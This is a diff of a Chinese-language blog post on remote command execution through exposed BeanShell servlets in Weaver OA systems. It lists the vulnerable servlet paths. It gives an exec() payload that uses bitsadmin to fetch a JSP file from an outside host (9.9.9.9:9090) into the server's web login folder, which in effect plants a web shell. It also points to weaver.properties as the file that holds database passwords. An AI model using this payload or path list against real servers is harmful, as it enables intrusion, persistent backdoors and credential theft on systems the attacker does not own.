@@ -6,15 +6,15 @@
   
   <title>BeanShell任意命令执行 | Dhayser&#39;s space</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="beanshell官方文档 weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码">
+  <meta name="description" content="beanshell官方文档 用处他是Java语法规范的脚本语言，可以用来执行他本身预设的命令和函数，正因为那些命令和函数，攻击者可以构造有威胁的命令，对信息系统造成威胁。 哪些适用（规则）uri带有以下内容，我这里举例子的是关于OA的uri  &#x2F;weaver&#x2F;bsh.servlet.BshServlet &#x2F;servlet&#x2F;~ic&#x2F;bsh.servl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BeanShell任意命令执行">
 <meta property="og:url" content="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Dhayser&#39;s space">
-<meta property="og:description" content="beanshell官方文档 weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码">
+<meta property="og:description" content="beanshell官方文档 用处他是Java语法规范的脚本语言，可以用来执行他本身预设的命令和函数，正因为那些命令和函数，攻击者可以构造有威胁的命令，对信息系统造成威胁。 哪些适用（规则）uri带有以下内容，我这里举例子的是关于OA的uri  &#x2F;weaver&#x2F;bsh.servlet.BshServlet &#x2F;servlet&#x2F;~ic&#x2F;bsh.servl">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-11-26T02:26:33.000Z">
-<meta property="article:modified_time" content="2022-11-26T04:42:56.865Z">
+<meta property="article:modified_time" content="2022-12-08T02:16:30.296Z">
 <meta property="article:author" content="Dhayser Li">
 <meta name="twitter:card" content="summary">
   
@@ -96,12 +96,20 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p><a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a></p>
+<h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>他是Java语法规范的脚本语言，可以用来执行他本身预设的命令和函数，正因为那些命令和函数，攻击者可以构造有威胁的命令，对信息系统造成威胁。</p>
+<h2 id="哪些适用（规则）"><a href="#哪些适用（规则）" class="headerlink" title="哪些适用（规则）"></a>哪些适用（规则）</h2><p>uri带有以下内容，我这里举例子的是关于OA的uri</p>
+<ul>
+<li>&#x2F;weaver&#x2F;bsh.servlet.BshServlet</li>
+<li>&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet</li>
+</ul>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>具体更多玩法看<a target="_blank" rel="noopener" href="http://www.beanshell.org/manual/bshcommands.html">beanshell官方文档</a>，以下使用简单的exec() dir()函数作为样例。</p>
+<h4 id="首先查看当前权限"><a href="#首先查看当前权限" class="headerlink" title="首先查看当前权限"></a>首先查看当前权限</h4><h4 id="查看当前目录，并找到web目录"><a href="#查看当前目录，并找到web目录" class="headerlink" title="查看当前目录，并找到web目录"></a>查看当前目录，并找到web目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://9.9.9.9:9090/2.jsp d:\\weaver\\ecology\\login\\123.jsp&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p>weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clbd1zyvm0001xkhfhe0kh9b0" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clbegak4q00003jhfg2zs8vhf" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
       
       
       
